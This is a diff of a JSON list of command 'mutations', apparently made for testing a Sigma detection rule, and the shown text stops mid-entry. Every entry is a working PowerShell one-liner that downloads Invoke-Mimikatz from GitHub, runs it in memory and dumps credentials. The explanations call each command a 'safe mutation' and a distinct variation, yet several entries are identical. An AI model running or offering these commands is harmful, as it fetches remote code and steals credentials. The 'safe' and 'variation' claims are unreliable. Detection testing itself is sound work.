@@ -1,6 +1,23 @@
 [
   {
     "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
-    "explanation": "This command uses a direct PowerShell invocation of the Invoke-Mimikatz script with the -DumpCreds option, which is already detected by the Sigma rule. It is provided as a baseline for comparison."
-  }
-]
+    "explanation": "This command uses a direct PowerShell invocation with the -Command flag, which is a syntactic variation of the original command. It avoids using string concatenation or obfuscation techniques and is a safe mutation for testing purposes."
+  },
+  {
+    "output": "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+    "explanation": "This command uses the short form of the -Command flag (-c) as a substitution technique. It is functionally equivalent to the original command and is a safe mutation for testing purposes."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+    "explanation": "This command uses the -Command flag explicitly, which is a syntactic variation of the original command. It is a safe mutation for testing purposes."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+    "explanation": "This command uses the -Command flag explicitly, which is a syntactic variation of the original command. It is a safe mutation for testing purposes."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+    "explanation": "This command uses the -Command flag explicitly, which is a syntactic variation of the original command. It is a safe mutation for testing purposes."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec
